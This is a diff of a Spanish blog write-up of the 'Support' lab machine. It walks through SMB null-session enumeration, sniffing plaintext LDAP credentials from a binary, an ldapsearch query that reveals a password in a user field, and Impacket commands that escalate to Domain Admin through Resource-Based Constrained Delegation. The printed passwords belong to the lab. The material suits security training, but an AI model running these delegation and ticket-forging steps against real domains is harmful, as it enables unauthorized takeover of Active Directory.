@@ -2,13 +2,26 @@
 title: "Support (Easy)"
 date: 2026-01-13
 author: "Isma"
-tags: ["Windows"]
+tags: ["Windows", "AD", "RBCD"]
+categories: ["Machine"]
 slug: "support"
 draft: false
 ---
 
 
-# Scan
+## Resumen
+
+
+Write-up de la máquina **Support (Easy)**. Incluye enumeración, extracción de credenciales, acceso como usuario y escalada mediante **RBCD**.
+
+
+![Imagen del post](/images/notion/2e8888fa-f353-8013-b9cf-e4e76515e53d.png)
+
+
+## Enumeración
+
+
+### Escaneo de puertos
 
 
 ```powershell
@@ -54,10 +67,10 @@ Host script results:
 ```
 
 
-Puerto 443 SMB:
+### SMB (445)
 
 
-Se puede entrar con null session.
+Se puede enumerar mediante **null session**.
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-8068-aea3-c601dc4e36a7.png)
@@ -66,16 +79,13 @@ Se puede entrar con null session.
 ![Imagen del post](/images/notion/2e7888fa-f353-80c1-8a62-d91125cc9722.png)
 
 
-Nos llevamos todas esas tools para analisis.
+Recogemos herramientas para el análisis y llama la atención **UserInfo.exe**. Lo descomprimimos y revisamos DLLs y ficheros de configuración. Con `strings` no aparece nada útil inicialmente.
 
 
-Llama la atención el  archivo UserInfo.exe, lo descomprimimos, vemos algunas dll’s y archivos de configuración, los analizamos con “strings” pero nada de momento…
+## Análisis de UserInfo.exe (extracción de credenciales)
 
 
-Tenemos que instalarnos Powershell para poder analizar y ejecutar el Binario desde nuestra Kali.
-
-
-Instalamos mono.
+Para poder ejecutar el binario desde Kali, instalamos dependencias y lo probamos con **mono**.
 
 
 ```powershell
@@ -107,46 +117,48 @@ Did you mean:
 ```
 
 
-Vemos que tenemos un error de connexion, abrimos WireShark y analizamos el error.
+Aparece un **Connect Error**. Abrimos Wireshark para entender qué ocurre.
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-80a2-9911-db18444f20db.png)
 
 
-Nos falta asignar el nombre de dominio a la IP para que el DNS resuelva.
+La causa es que necesitamos resolver el dominio (añadir el nombre de dominio a la IP, para que el DNS resuelva correctamente).
 
 
-Vemos que el binario UserInfo.exe se intenta comunicar con el servidor mediante el usuario ldap
+Al revisar el tráfico, vemos que **UserInfo.exe** se comunica con el servidor usando el usuario **ldap**.
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-80f3-b919-f11fcdc5ac33.png)
 
 
-El problema es que las credenciales se envian en texto plano, asi que tenemos las primeras credenciales.
+Lo importante: las credenciales viajan **en texto plano**, así que obtenemos el primer par usuario:contraseña.
 
 
+```plain text
 ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+```
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-809d-a8b6-e687ba095d23.png)
 
 
-Bien! Tenemos el primer user de dominio.
+## Enumeración de AD
 
 
-Enumeramos con Bloodhound.
+Con estas credenciales lanzamos enumeración con BloodHound.
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-803c-b3ce-f921b4ceb5cb.png)
 
 
-No tenemos nada de info, pero lo más extraño es el user support.htb
+No aparece un camino directo, pero destaca el usuario **support.htb**, ya que pertenece a un grupo no estándar.
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-808f-8e7c-e6ca43ccc88c.png)
 
 
-Ya que esta en un grupo que no es default.
+Como BloodHound no siempre recoge todo, enumeramos también vía **LDAP** para obtener campos adicionales (por ejemplo, `info`).
 
 
 ```powershell
@@ -154,97 +166,41 @@ ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf
 ```
 
 
-Con esto podemos enumerar mediante LDAP, extraer más info que no nos daria bloodhound, como por ejemplo el field ‘info’ de un usuario, como el siguiente, donde tenemos una plain cred.
+En la salida encontramos una credencial en claro en el campo `info` de un usuario.
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-80c5-bfc1-f96394a9d81e.png)
 
 
+```plain text
 support.htb:Ironside47pleasure40Watchful
+```
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-805f-a01f-f76834589eda.png)
 
 
-Tenemos user flag.
+Con esto obtenemos la **user flag**.
 
 
 ![Imagen del post](/images/notion/2e7888fa-f353-8000-98a8-db67e2aaa6a7.png)
 
 
-Tenemos este esquema para llegar a Domain Admin.
+## Escalada: Resource-Based Constrained Delegation (RBCD)
 
 
-Seguimos los pasos para explotar desde bloodhound
+A partir del grafo de BloodHound, el camino a **Domain Admin** pasa por **RBCD**.
 
 
-Resource-Based Constrained Delegation
+### Resumen rápido de RBCD
+
+- **Objetivo:** lograr que un equipo/servicio acepte que nuestra cuenta puede **suplantar** (impersonate) a otro usuario al pedir tickets Kerberos.
+- **Idea:** crear una cuenta de máquina controlada por el atacante, permitirle actuar en nombre de otros sobre el objetivo y luego solicitar un ticket para un servicio del objetivo suplantando a `Administrator`.
+
+### Paso 1: crear una cuenta de equipo controlada por el atacante
 
 
-First,if an attacker does not control an account with an SPN set, a new 
-attacker-controlled computer account can be added with Impacket's 
-addcomputer.py example script:
-
-
-```plain text
-addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'
-```
-
-
-We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:
-
-
-```plain text
-rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'
-```
-
-
-And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.
-
-
-```plain text
-getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
-```
-
-
-This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.
-
-
-
-El **Resource-Based Constrained Delegation (RBCD)** es un ataque que aprovecha una característica de Active Directory para "engañar" a un servidor y hacer que nos deje entrar como si fuéramos el Administrador.
-
-
-### 1. Crear un "Cómplice" (La Cuenta de Computadora)
-
-
-Normalmente, un usuario normal no puede delegar permisos. Pero las **cuentas de computadora** sí pueden.
-
-- **Qué haces:** Creas una cuenta nueva en el dominio (ej. `ATTACKERSYSTEM$`).
-- **Por qué:** Necesitas un objeto que tenga permisos especiales de Kerberos para pedir tickets en nombre de otros.
-
----
-
-
-### 2. Convencer al Objetivo de que "Confíe" en ti
-
-
-Ahora le dices al servidor que quieres atacar (el Target) que tu cuenta nueva (`ATTACKERSYSTEM$`) tiene permiso para hablar en nombre de cualquier usuario.
-
-- **Qué haces:** Usas `rbcd.py` para escribir en un atributo del servidor objetivo llamado `msDS-AllowedToDelegateToAccount`.
-- **El resultado:** El servidor objetivo ahora dice: _"Confío en lo que ATTACKERSYSTEM$ me diga sobre quién es el usuario"_.
-
----
-
-
-### 3. Pedir la "Llave Maestra" (El Ticket)
-
-
-Ahora que el servidor confía en tu cuenta creada, pides un ticket de acceso diciendo que eres el Administrador.
-
-- **Qué haces:** Usas `getST.py` (Get Service Ticket). Tu cuenta `ATTACKERSYSTEM$` pide un ticket para el servicio (ej. `CIFS` para archivos o `HTTP` para WinRM) del servidor objetivo, **suplantando** al usuario `Administrator`.
-- **El premio:** Obtienes un archivo `.ccache` (un ticket de Kerberos).
-
-Comandos utilizados.
+    (Usamos Impacket para crear `ATTACKERSYSTEM$`.)
 
 
 ```powershell
@@ -254,6 +210,12 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
 ```
+
+
+### Paso 2: permitir delegación sobre el objetivo (DC$)
+
+
+    Escribimos el atributo para que `ATTACKERSYSTEM$` pueda actuar en nombre de otros usuarios sobre el objetivo.
 
 
 ```powershell
@@ -267,6 +229,9 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Accounts allowed to act on behalf of other identity:
 [*]     ATTACKERSYSTEM$   (S-1-5-21-1677581083-3380853377-188903654-6103)
 ```
+
+
+### Paso 3: solicitar un Service Ticket suplantando a Administrator
 
 
 ```powershell
@@ -290,8 +255,5 @@ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
 ![Imagen del post](/images/notion/2e7888fa-f353-8030-a1a9-e5afe5793bfe.png)
 
 
-Lesgo.
-
-
-![Imagen del post](/images/notion/2e7888fa-f353-806a-b9a4-f5578000b1bf.png)
+Con el ticket en sesión, ya tenemos acceso como **administrator**.
 
